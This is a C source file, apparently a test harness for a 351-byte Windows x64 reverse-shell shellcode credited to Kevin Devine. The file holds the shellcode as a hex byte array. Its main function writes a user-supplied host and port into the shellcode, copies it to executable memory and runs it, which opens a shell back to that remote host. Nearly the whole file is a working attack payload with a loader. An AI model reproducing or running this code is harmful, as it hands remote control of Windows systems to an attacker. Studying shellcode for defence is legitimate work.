
#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")
#define in_addr_t unsigned long

//
// 351 bytes reverse shell for windows 64 using ipv4
//
// Copyright (c) 2014 Kevin Devine
//
// cl rev_overlap64_test.cpp
//
// generated with: xxd -i rev_overlap64.bin

unsigned char code[] = 
{ 0x53, 0x56, 0x57, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
  0x4c, 0x8b, 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x28, 0xf9,
  0xeb, 0x6e, 0x5e, 0x48, 0x8d, 0x6e, 0x24, 0x33, 0xc0, 0x99, 0xb2, 0xe8,
  0x2b, 0xe2, 0x8b, 0xca, 0x48, 0x8b, 0xfc, 0xf3, 0xaa, 0xb8, 0x9c, 0x92,
  0x9b, 0xff, 0xf7, 0xd0, 0x48, 0x8d, 0x7c, 0x24, 0x50, 0x4c, 0x8b, 0xe7,
  0x48, 0xab, 0x4c, 0x8b, 0xef, 0x48, 0xad, 0x48, 0xf7, 0xd0, 0x48, 0xab,
  0x48, 0xaf, 0x4c, 0x8b, 0xf7, 0x6a, 0x68, 0x58, 0xab, 0x41, 0xff, 0x46,
  0x3d, 0x4c, 0x89, 0x74, 0x24, 0x40, 0x49, 0x8d, 0x7e, 0x50, 0x4d, 0x33,
  0xc9, 0x4d, 0x33, 0xc0, 0xb2, 0x01, 0xb1, 0x02, 0xff, 0xd5, 0x48, 0xab,
  0x48, 0xab, 0x48, 0xab, 0x48, 0xaf, 0x93, 0x48, 0x89, 0x7c, 0x24, 0x48,
  0xff, 0x44, 0x24, 0x20, 0x6a, 0x10, 0x41, 0x58, 0x49, 0x8b, 0xd5, 0x8b,
  0xcb, 0xff, 0xd5, 0xf8, 0x72, 0x33, 0x4d, 0x33, 0xc0, 0x4d, 0x33, 0xc9,
  0x49, 0x8b, 0xd4, 0x91, 0xff, 0xd5, 0x83, 0xca, 0xff, 0x48, 0x8b, 0x0f,
  0xff, 0xd5, 0x48, 0x8b, 0x0f, 0xff, 0xd5, 0x48, 0x8b, 0x4f, 0x08, 0xff,
  0xd5, 0x8b, 0xcb, 0xff, 0xd5, 0x49, 0x8b, 0xe7, 0x41, 0x5f, 0x41, 0x5e,
  0x41, 0x5d, 0x41, 0x5c, 0x5d, 0x5f, 0x5e, 0x5b, 0xc3, 0xe8, 0x58, 0xff,
  0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0xa5,
  0xc1, 0x87, 0xec, 0x80, 0x9c, 0xe4, 0xfe, 0xdf, 0x72, 0x17, 0x4b, 0xda,
  0x38, 0x53, 0x35, 0xc9, 0x1e, 0x7f, 0x35, 0xc9, 0x1e, 0x7f, 0x6e, 0xed,
  0xcd, 0xa2, 0xad, 0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57, 0x6a, 0x60,
  0x5e, 0x65, 0x48, 0xad, 0x48, 0x8b, 0x40, 0x18, 0x4c, 0x8b, 0x50, 0x30,
  0x49, 0x8b, 0x6a, 0x10, 0x4d, 0x8b, 0x12, 0x8b, 0x45, 0x3c, 0x83, 0xc0,
  0x10, 0x8b, 0x44, 0x28, 0x78, 0x48, 0x8d, 0x74, 0x28, 0x18, 0xad, 0x91,
  0x67, 0xe3, 0xe5, 0xad, 0x4c, 0x8d, 0x1c, 0x28, 0xad, 0x48, 0x8d, 0x3c,
  0x28, 0xad, 0x48, 0x8d, 0x1c, 0x28, 0x8b, 0x74, 0x8f, 0xfc, 0x48, 0x03,
  0xf5, 0x33, 0xc0, 0x99, 0xac, 0x03, 0xd0, 0xc1, 0xc2, 0x07, 0x33, 0xd0,
  0xff, 0xc8, 0x79, 0xf4, 0x48, 0x3b, 0x54, 0x24, 0x30, 0xe0, 0xe3, 0x75,
  0xb7, 0x0f, 0xb7, 0x14, 0x4b, 0x41, 0x8b, 0x04, 0x93, 0x48, 0x03, 0xe8,
  0x48, 0x89, 0x6c, 0x24, 0x30, 0x5f, 0x5e, 0x5d, 0x5b, 0x5a, 0x59, 0x58,
  0xff, 0xe0, 0xc3 };

/**********************************************************************
 *  Resolve ip or hostname
 **********************************************************************/
in_addr_t resolve (char host[]) {
  struct      hostent *hp;
  in_addr_t   host_ip = 0;

  host_ip = inet_addr (host);
  
  if (host_ip == INADDR_NONE) {
    hp = gethostbyname (host);
    if (hp != NULL) {
      host_ip = *(in_addr_t *)hp->h_addr;
    }
  }
  return host_ip;
}

int main (int argc, char* argv[]) {
  
  if (argc != 3) {
    printf ("\nUsage: rev_overlap32_test <host> <port>\n");
    return 0;
  }
  
  // required for shellcode to run
  WSADATA wsa;
  WSAStartup (MAKEWORD(2, 0), &wsa);
  
  sockaddr_in *p = (sockaddr_in*)&code[194];
  in_addr_t ip = ~resolve (argv[1]);
  
  memcpy (&p->sin_addr, &ip, sizeof (ip));
  p->sin_port   = ~htons (atoi(argv[2]));
  p->sin_family = ~AF_INET;
  
  void *exec = VirtualAlloc(0, sizeof (code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, code, sizeof (code));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  WSACleanup();
  return 0;
}

